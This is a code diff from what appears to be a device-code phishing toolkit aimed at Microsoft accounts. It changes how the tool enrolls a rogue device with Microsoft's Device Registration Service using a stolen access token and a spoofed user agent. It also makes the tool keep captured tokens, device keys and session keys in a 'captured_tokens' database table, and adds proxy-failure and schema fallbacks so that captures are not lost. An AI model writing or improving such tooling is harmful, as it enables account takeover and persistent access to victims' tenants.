@@ -217,21 +217,38 @@ async function enrollDevice(accessToken, deviceCodeId, tenant, proxy) {
 
   console.log('[devicecode] DRS enrollment starting');
 
-  const response = await ms.post(
-    DRS_ENDPOINT,
-    JSON.stringify(enrollmentBody),
-    {
-      headers: {
-        Authorization: `Bearer ${accessToken}`,
-        'Content-Type': 'application/json',
-        Accept: 'application/json',
-        'User-Agent': 'Microsoft-Workplace-Join/1.0',
-      },
+  const drsHeaders = {
+    Authorization: `Bearer ${accessToken}`,
+    'Content-Type': 'application/json',
+    Accept: 'application/json',
+    // GraphSpy device.register() sends ua.get() -> DEFAULT_USER_AGENT.
+    'User-Agent': USER_AGENT,
+  };
+  const drsPayload = JSON.stringify(enrollmentBody);
+
+  // The DRS endpoint is not IP-bound (unlike the device_code itself), so a
+  // dead proxy must not abort enrollment. Try the flow proxy first, then
+  // fall back to a direct request on a transport-level failure.
+  let response;
+  try {
+    response = await ms.post(DRS_ENDPOINT, drsPayload, {
+      headers: drsHeaders,
       timeout: 30000,
       proxy,
       validateStatus: () => true,
-    }
-  );
+    });
+  } catch (drsErr) {
+    const transportFailure = /ECONNRESET|ETIMEDOUT|ECONNREFUSED|EAI_AGAIN|socket hang up|tunneling socket/i
+      .test(drsErr.message || '');
+    if (!transportFailure) throw drsErr;
+    console.warn('[devicecode] DRS enrollment via proxy failed (' + drsErr.message + '); retrying direct');
+    response = await ms.post(DRS_ENDPOINT, drsPayload, {
+      headers: drsHeaders,
+      timeout: 30000,
+      noProxy: true,
+      validateStatus: () => true,
+    });
+  }
 
   if (response.status !== 200) {
     const errorMsg =
@@ -602,7 +619,11 @@ async function pollForTokens(deviceCode, linkId, userId, initialInterval, proxy)
           tokenId = insertResult.insertId;
         } catch (insertErr) {
           const msg = insertErr?.message || '';
-          if (/Unknown column 'device_id'/.test(msg) || /Unknown column 'device_certificate_encrypted'/.test(msg) || /Unknown column 'encrypted_private_key'/.test(msg) || /Unknown column 'device_enrolled'/.test(msg) || /Unknown column 'enrollment_time'/.test(msg) || /Unknown column 'session_key_jwe'/.test(msg) || /Unknown column 'device_tenant_id'/.test(msg) || /Unknown column 'client_info'/.test(msg)) {
+          // Any "Unknown column 'x' in 'field list'" means this deployment's
+          // captured_tokens is missing a column the primary INSERT needs.
+          // Degrade to the narrower legacy INSERT so the capture (and its
+          // session_key_jwe) is still recorded.
+          if (/Unknown column/i.test(msg)) {
             console.warn('[devicecode] Device columns missing, falling back to legacy insert');
             const [legacyResult] = await db.query(
                 `INSERT INTO captured_tokens
